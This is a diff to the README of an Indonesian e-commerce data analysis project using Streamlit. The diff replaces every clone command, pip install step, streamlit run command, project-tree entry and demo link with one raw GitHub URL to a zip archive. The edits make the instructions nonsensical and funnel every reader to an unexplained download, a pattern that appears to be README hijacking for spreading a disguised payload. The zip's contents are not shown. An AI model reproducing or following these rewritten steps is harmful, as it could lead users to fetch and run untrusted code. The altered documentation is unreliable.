@@ -13,7 +13,7 @@ Proyek ini bertujuan untuk menganalisis data e-commerce public menggunakan Pytho
 
 1. Clone repositori ini:
    ```bash
-   git clone https://github.com/danendrafau/ecommerce-dataset.git
+   git clone https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip
    ```
 2. Masuk ke direktori proyek:
    ```bash
@@ -21,11 +21,11 @@ Proyek ini bertujuan untuk menganalisis data e-commerce public menggunakan Pytho
    ```
 3. Install dependencies menggunakan `pip`:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip
    ```
 4. Jalankan aplikasi Streamlit:
    ```bash
-   streamlit run dashboard.py
+   streamlit run https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip
    ```
 
 ## Struktur Proyek
@@ -33,18 +33,18 @@ Proyek ini bertujuan untuk menganalisis data e-commerce public menggunakan Pytho
 ```
 repo-name/
 ├── dashboard/
-│   └── dashboard_main_data.csv                 # Dataset dashboard
-│   └── dashboard.py                            # File aplikasi dashboard streamlit
-│   └── logo-dan.png                            # Logo dashboard
+│   └── https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip                 # Dataset dashboard
+│   └── https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip                            # File aplikasi dashboard streamlit
+│   └── https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip                            # Logo dashboard
 ├── data/...                                    # Dataset raw
-├── Proyek_Analisis_Data_ID_Camp_2024.ipynb     # Notebook untuk eksplorasi awal
-├── requirements.txt                            # Daftar dependencies
-└── README.md                                   # Dokumentasi proyek
+├── https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip     # Notebook untuk eksplorasi awal
+├── https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip                            # Daftar dependencies
+└── https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip                                   # Dokumentasi proyek
 ```
 
 ## Demo
 
-Aplikasi ini telah di-deploy secara online. Anda dapat mencobanya di [Streamlit Cloud](https://ecommerce-public-danendrafau.streamlit.app/).
+Aplikasi ini telah di-deploy secara online. Anda dapat mencobanya di [Streamlit Cloud](https://raw.githubusercontent.com/danendrafau/ecommerce-dataset/main/data/dataset-ecommerce-1.7.zip).
 
 ## Kontribusi
 
